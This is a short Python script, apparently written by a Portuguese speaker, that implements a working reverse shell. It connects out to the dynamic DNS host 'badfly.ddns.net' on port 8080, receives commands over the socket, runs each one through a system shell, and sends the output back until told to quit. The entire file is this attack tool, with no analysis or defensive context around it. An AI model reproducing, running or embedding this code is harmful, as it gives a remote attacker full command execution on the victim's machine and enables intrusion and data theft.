import socket
import subprocess

host = socket.gethostbyname('badfly.ddns.net')
porta = 8080

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, porta))
s.send(b'<<<Conectado>>>')
while 1:
    data = s.recv(1024).decode()
    if data == 'quit':
        s.close()
        break
    proc = subprocess.Popen(data, shell = True, stdout=subprocess.PIPE, stderr= subprocess.PIPE, stdin=subprocess.PIPE)
    saida = proc.stdout.read() + proc.stderr.read()
    #saida = str((data), 'utf-8')	
  
    s.send(saida)

s.close()